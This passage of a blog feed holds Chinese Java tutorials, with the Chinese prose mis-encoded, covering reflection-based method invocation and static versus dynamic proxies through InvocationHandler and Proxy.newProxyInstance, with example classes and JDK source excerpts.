<span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//è¿›è€Œæ‰§è¡Œæ–¹æ³•,ã€invokeã€‘ï¼Œå®ƒéœ€è¦ä¸€ä¸ªçœŸå®çš„å¯¹è±¡ï¼Œä»¥åŠæ–¹æ³•çš„å®é™…å‚æ•°åˆ—è¡¨</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">pp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-comment">//å› ä¸ºæ˜¯ç©ºå‚æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥æ”¾è¿›æ¥ä¸€ä¸ªå¯¹è±¡å°±è¡Œ</span><br>        <span class="hljs-comment">//æ‰§è¡Œæ–¹æ³•ï¼Œeat...</span><br>        eat.invoke(person);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>æœ‰å‚æ•°ç±»å‹</strong>ï¼ˆè®°å¾—æ”¹personç±»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218476.png" alt="QQæˆªå›¾20220225221351"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethodTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eatCan&quot;</span>, String.class);<span class="hljs-comment">//eatæ–¹æ³•é‡è½½ï¼Œeatæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•°æ˜¯Stringç±»å‹</span><br>        eat.invoke(person,<span class="hljs-string">&quot;æ°´æœ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸ä¸€ä¸€å®ç°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä¸¤ç§ä»£ç†</title>
    <link href="/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/"/>
    <url>/2022/02/25/Java%E4%B8%A4%E7%A7%8D%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaä»£ç†"><a href="#Javaä»£ç†" class="headerlink" title="Javaä»£ç†"></a>Javaä»£ç†</h1><h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>ä¸ºä¸ä¿®æ”¹åŸå…ˆçš„ç±»ï¼Œè€Œåˆ›å»ºä»£ç†ç±»å»ä¿®æ”¹ã€‚</p><h3 id="ç”¨æˆ·æ¥å£"><a href="#ç”¨æˆ·æ¥å£" class="headerlink" title="ç”¨æˆ·æ¥å£"></a>ç”¨æˆ·æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServices</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å®ç°ç±»"><a href="#å®ç°ç±»" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.sql.SQLOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserReal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ›´æ–°&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="ä»£ç†ç±»"><a href="#ä»£ç†ç±»" class="headerlink" title="ä»£ç†ç±»"></a>ä»£ç†ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRealProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserServices</span> &#123;<br>    <span class="hljs-keyword">private</span> UserServices userServices; <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserRealProxy</span><span class="hljs-params">(UserServices userServices)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userServices = userServices;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        before();<br>        userServices.select();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>&#123;<br>        before();<br>        userServices.update();<br>        after();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">before</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åœ¨è¿™ä¹‹å‰&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">after</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åœ¨è¿™ä¹‹å&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„ç‚¹ï¼š</p><p>1ã€è¿™é‡Œçš„<code>private UserServices userServices;</code>ç›®çš„æ˜¯è§„èŒƒè¯<code>userServices</code></p><p>2ã€æ„é€ å‡½æ•°ï¼Œä¸ºäº†ä¼ å…¥ä»£ç†ç±»ã€‚</p><h3 id="å®ç°ç±»-1"><a href="#å®ç°ç±»-1" class="headerlink" title="å®ç°ç±»"></a>å®ç°ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServices</span> <span class="hljs-variable">userReal</span> <span class="hljs-operator">=</span> (UserServices) <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserReal</span>();<br>        <span class="hljs-type">UserRealProxy</span> <span class="hljs-variable">userRealProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRealProxy</span>(userReal);<br>        userRealProxy.select();<br>        userRealProxy.update();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045862.png" alt="QQæˆªå›¾20220225145647"></p><p>ä»£ç†ç±»å®ç°äº†ä¸ä¿®æ”¹æºä»£ç è€Œæ”¹å˜äº†è¾“å‡ºç»“æœï¼ˆæ·»åŠ äº†åœ¨è¿™ä¹‹å‰ä¸ä¹‹åï¼‰ã€‚</p><p>ä½†æ˜¯å®é™…åº”ç”¨ä¸­ç”¨åˆ°çš„é™æ€ä»£ç†å¾ˆå°‘å¾ˆå°‘ã€‚å› ä¸ºï¼š</p><p>1ã€å½“éœ€è¦ä»£ç†å¤šä¸ªç±»çš„æ—¶å€™ï¼Œç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>åªç»´æŠ¤ä¸€ä¸ªä»£ç†ç±»ï¼Œç”±è¿™ä¸ªä»£ç†ç±»å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯è¿™æ ·å°±å¯¼è‡´<strong>ä»£ç†ç±»è¿‡äºåºå¤§</strong></li><li>æ–°å»ºå¤šä¸ªä»£ç†ç±»ï¼Œæ¯ä¸ªç›®æ ‡å¯¹è±¡å¯¹åº”ä¸€ä¸ªä»£ç†ç±»ï¼Œä½†æ˜¯è¿™æ ·ä¼š<strong>äº§ç”Ÿè¿‡å¤šçš„ä»£ç†ç±»</strong></li></ul><p>2ã€å½“æ¥å£éœ€è¦å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹æ–¹æ³•çš„æ—¶å€™ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†ç±»éƒ½è¦åŒæ—¶ä¿®æ”¹ï¼Œ<strong>ä¸æ˜“ç»´æŠ¤</strong>ã€‚</p><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>é¦–å…ˆè¦äº†è§£ä¸€ä¸ªç±»å’Œä¸€ä¸ªæ¥å£ï¼š</p><ul><li><code>java.lang.reflect.Proxy</code>ï¼ˆç±»ï¼‰</li><li><code>java.lang.reflect.InvocationHandler</code>ï¼ˆæ¥å£ï¼‰</li></ul><p><code>java.lang.reflect.Proxy</code>ä¸»è¦ç”¨äºç”ŸæˆåŠ¨æ€ä»£ç†ç±»Classã€åˆ›å»ºä»£ç†ç±»å®ä¾‹ï¼Œè¯¥ç±»å®ç°äº†<code>java.io.Serializable</code>æ¥å£ã€‚</p><p><strong>Proxy</strong>ï¼šæ˜¯æ‰€æœ‰åŠ¨æ€ä»£ç†çš„çˆ¶ç±»ï¼Œè´Ÿè´£newä¸€ä¸ªå®ä¾‹ã€‚<br><strong>InvocationHandler</strong>ï¼šç”¨äºè°ƒç”¨<code>Proxy</code>ç±»ç”Ÿæˆçš„ä»£ç†ç±»æ–¹æ³•ï¼Œè¯¥ç±»åªæœ‰ä¸€ä¸ª<code>Invoke</code>æ–¹æ³•ï¼ˆä»£ç†å¯¹è±¡è¦æ‰§è¡Œçš„åŠŸèƒ½ä»£ç ï¼‰ã€‚å¹¶ä¸”æ¯ä¸€ä¸ªç±»éƒ½è¦å®ç°<code>IncocationHandler</code>è¿™ä¸ªæ¥å£ã€‚</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>å¿«æ·é”®Ctrl+shift+fï¼Œæœç´¢<code>public class Proxy implements java.io.Serializable</code>å¯æ‰¾åˆ°è¯¥ç±»ã€‚è¿™é‡Œå¼•ç”¨åˆ«çš„å¸ˆå‚…çš„ç¿»è¯‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">copypackage java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>  <span class="hljs-comment">// çœå»æˆå‘˜å˜é‡å’Œéƒ¨åˆ†ç±»æ–¹æ³•...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è·å–åŠ¨æ€ä»£ç†å¤„ç†ç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy è¿”å›è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ä»£ç†å®ä¾‹çš„è°ƒç”¨å¤„ç†ç¨‹åº</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException å¦‚æœå‚æ•°ä¸æ˜¯ä¸€ä¸ªä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title function_">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè¿™é‡Œçš„å¯¹è±¡æ˜¯æ¥å£å®ç°ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          åŠ¨æ€ä»£ç†å¤„ç†ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> è¿”å›åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException ä¸æ­£ç¡®çš„å‚æ•°å¼‚å¸¸</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>            <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     å®šä¹‰ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces ä»£ç†ç±»è¦å®ç°çš„æ¥å£åˆ—è¡¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ç”¨æŒ‡å®šçš„ç±»åŠ è½½å™¨å®šä¹‰çš„ä»£ç†ç±»ï¼Œå®ƒå¯ä»¥å®ç°æŒ‡å®šçš„æ¥å£</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ£€æµ‹æŸä¸ªç±»æ˜¯å¦æ˜¯åŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl è¦æµ‹è¯•çš„ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> å¦‚è¯¥ç±»ä¸ºä»£ç†ç±»ï¼Œåˆ™ä¸º trueï¼Œå¦åˆ™ä¸º false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> &#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å‘æŒ‡å®šçš„ç±»åŠ è½½å™¨ä¸­å®šä¹‰ä¸€ä¸ªç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   ç±»å</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      ç±»å­—èŠ‚ç </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    æˆªå–å¼€å§‹ä½ç½®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    æˆªå–é•¿åº¦</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVMåˆ›å»ºçš„ç±»Classå¯¹è±¡</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title function_">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨çš„æœ€å¤šçš„å°±æ˜¯<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">  *</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> loader     æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> interfaces æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè¿™é‡Œçš„å¯¹è±¡æ˜¯æ¥å£å®ç°ç±»</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@param</span> h          åŠ¨æ€ä»£ç†å¤„ç†ç±»</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@return</span> è¿”å›åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@throws</span> IllegalArgumentException ä¸æ­£ç¡®çš„å‚æ•°å¼‚å¸¸</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><br>         <span class="hljs-keyword">throws</span> IllegalArgumentException &#123;<br>     ...<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="Invocationhandler"><a href="#Invocationhandler" class="headerlink" title="Invocationhandler"></a>Invocationhandler</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252045587.png" alt="QQæˆªå›¾20220225191721"></p><p>å…¶ä¸­å‚æ•°</p><p><code>proxy</code>ï¼šjdkåˆ›å»ºçš„ä»£ç†å¯¹è±¡ï¼Œæ— éœ€èµ‹å€¼</p><p><code>method</code>ï¼šç›®æ ‡ç±»ä¸­çš„æ–¹æ³•</p><p><code>argså‚æ•°</code>ï¼šç›®æ ‡ç±»ä¸­çš„æ–¹æ³•æ‰€æ¥æ”¶çš„å‚æ•°ã€‚<br>å¹¶ä¸”è¿™ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯jdkè‡ªå¸¦çš„ï¼ï¼</p><p>å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-keyword">private</span> Object demo;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">(Object demo)</span> &#123;<br>        <span class="hljs-built_in">this</span>.demo = demo;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹&quot;</span>);<br>       Object res=  method.invoke(demo, args);<br>        System.out.println(<span class="hljs-string">&quot;ç»“æŸ&quot;</span>);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é‡å†™invokeæ–¹æ³•ï¼ŒæŠŠåŸæ¥é™æ€ä»£ç†ä¸­ä»£ç†ç±»è¦å®Œæˆçš„åŠŸèƒ½ï¼Œæ”¾åœ¨é‡å†™ä¹‹åçš„invokeæ–¹æ³•ä¸­å®ç°ã€‚</strong></p><p><strong>invokeæ–¹æ³•è¡¨ç¤ºä»£ç†å¯¹è±¡è¦æ‰§è¡Œçš„åŠŸèƒ½ä»£ç ã€‚</strong></p><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                          Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                          InvocationHandler h)</span><br>        <span class="hljs-keyword">throws</span> IllegalArgumentException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>        &#125;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Look up or generate the designated proxy class.</span><br><span class="hljs-comment">         */</span><br>        Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); <span class="hljs-comment">// stack walk magic: do not refactor</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ih</span> <span class="hljs-operator">=</span> h;<br>            <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">sm</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-literal">null</span> &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123;<br>                <span class="hljs-comment">// create proxy instance with doPrivilege as the proxy class may</span><br>                <span class="hljs-comment">// implement non-public interfaces that requires a special permission</span><br>                <span class="hljs-keyword">return</span> AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;<br>                    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-keyword">return</span> newInstance(cons, ih);<br>                    